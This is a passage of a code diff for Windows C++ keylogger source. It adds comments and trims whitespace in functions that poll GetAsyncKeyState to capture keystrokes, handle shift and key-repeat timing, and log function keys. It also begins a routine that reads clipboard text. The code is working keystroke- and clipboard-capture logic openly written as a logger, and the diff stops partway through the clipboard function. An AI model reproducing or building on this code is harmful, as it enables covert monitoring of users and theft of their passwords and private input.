@@ -75,38 +75,38 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
 FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
 {
     /*
-        validate the state of the buffer. noise on the buffer can generate errors         
-        check if the keystate is viable at this point.
-        check to see if a  keystroke has already been logged. not doing so will 
+        validate the state of the buffer. noise on the buffer can generate errors
+        check if the key state is viable at this point.
+        check to see if a  keystroke has already been logged. not doing so will
         result in erroneous behavior on the next pass
     */
    if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
-       {    
+       {
            /*
                 a key stroke was successfully logged set the global flag
                 to false.
             */
            gotchar=false;
            /*
-                ensure that the keystroke that was logged here is not due to 
+                ensure that the keystroke that was logged here is not due to
                 a contaminated keyboard buffer.
             */
            if (LastKeyStrokeLogged!=VkPrimary)
                {
                    /*
                         The buffer is clear of previous events but the user may
-                        be holding a key down, to deal with this problem we must 
+                        be holding a key down, to deal with this problem we must
                         set a timer to evaluate the keyboard behavior
                    */
                    Timer=clock();
-                   /* 
-                        synchronize two timers to be used in the event that the user 
+                   /*
+                        synchronize two timers to be used in the event that the user
                         is holding down a key.
                    */
                    Timer2=Timer;
                    /*
-                        determine if the shift has been toggled, if it has then 
-                        use the secondary mapping. 
+                        determine if the shift has been toggled, if it has then
+                        use the secondary mapping.
                    */
                    char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                     /*
@@ -124,29 +124,30 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                    }
                    /*
                         set the state for the last key stroke logged, this will
-                        allow the program to determine that the keyboard buffer 
+                        allow the program to determine that the keyboard buffer
                         has not yet been flushed.
                    */
                    LastKeyStrokeLogged=VkPrimary;
                }
             /*
-                see if the timer has elapsed to the right point. 
-                NOTE: for testing it is hard coded but this will be changed 
+                see if the timer has elapsed to the right point.
+                NOTE: for testing it is hard coded but this will be changed
                       to read necessary timing information off of the registry
                 timer one determines the primary time span before it is determined
                 that a user is holding a key down.
-                timer two is used to determine the interval by which keys are logged 
+                timer two is used to determine the interval by which keys are logged
                 to the buffer from that point until the buffer is flushed
             */
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    /*
                         reset timer two to the current clock.
-                   */
+                        IMPORTANT for if statement to function 
+                    */
                    Timer2=clock();
                    /*
                         determine if the shift key is toggled, to get the correct Primary
-                        key mapping. 
+                        key mapping.
                    */
                    char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                    /*
@@ -170,37 +171,87 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                    LastKeyStrokeLogged=VkPrimary;
                }
            }
-    /*
-        return the last keystroke logged. 
-    */
    return LastKeyStrokeLogged;
 }
 
 FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
 {
+    /*
+        validate the state of the buffer. noise on the buffer can generate errors
+        check if the key state is viable at this point.
+        check to see if a  keystroke has already been logged. not doing so will
+        result in erroneous behavior on the next pass
+    */
     if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
         {
+            /*
+                set the global flag to indicate that a character has been 
+                retrieved from the buffer.
+            */
             gotchar=false;
+            /*
+                check to ensure that the function key was not grabbed from
+                a contaminated key state buffer
+            */
             if (LastKeyStrokeLogged!=FunctionKey)
                 {
-                    Timer=clock();
-                    Timer2=Timer;
+                   /*
+                        The buffer is clear of previous events but the user may
+                        be holding a key down, to deal with this problem we must
+                        set a timer to evaluate the keyboard behavior
+                   */
+                   Timer=clock();
+                   /*
+                        synchronize two timers to be used in the event that the user
+                        is holding down a key.
+                   */
+                   Timer2=Timer;
+                   /*
+                        put the string representing a function key to the string
+                   */
                     cout<<StrOut;
+                    /*
+                        set the state of the last key stroke logged so
+                        this will allow the program to determine that the
+                        keyboard buffer has not yet been flushed.
+                   */
                     LastKeyStrokeLogged=FunctionKey;
                 }
+            /*
+                see if the timer has elapsed to the right point.
+                NOTE: for testing it is hard coded but this will be changed
+                      to read necessary timing information off of the registry
+                timer one determines the primary time span before it is determined
+                that a user is holding a key down.
+                timer two is used to determine the interval by which keys are logged
+                to the buffer from that point until the buffer is flushed
+            */
             if((Timer-clock())/500 && ((Timer2-clock())/31))
                 {
+                    /*
+                        reset timer two to the current clock.
+                        IMPORTANT for if statement to function 
+                    */
                     Timer2=clock();
+                   /*
+                        put the string representing a function key to the string
+                   */
                     cout<<StrOut;
+                    /*
+                        set the state of the last key stroke logged so
+                        this will allow the program to determine that the
+                        keyboard buffer has not yet been flushed.
+                   */
                     LastKeyStrokeLogged=FunctionKey;
                 }
         }
+
     return LastKeyStrokeLogged;
 }
 
 FORCEINLINE int grabclipboard()
 {
-    if (OpenClipboard(NULL))
+    if (OpenClipboard(NULL)) 
         {
             char* this_cb_data;
             HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
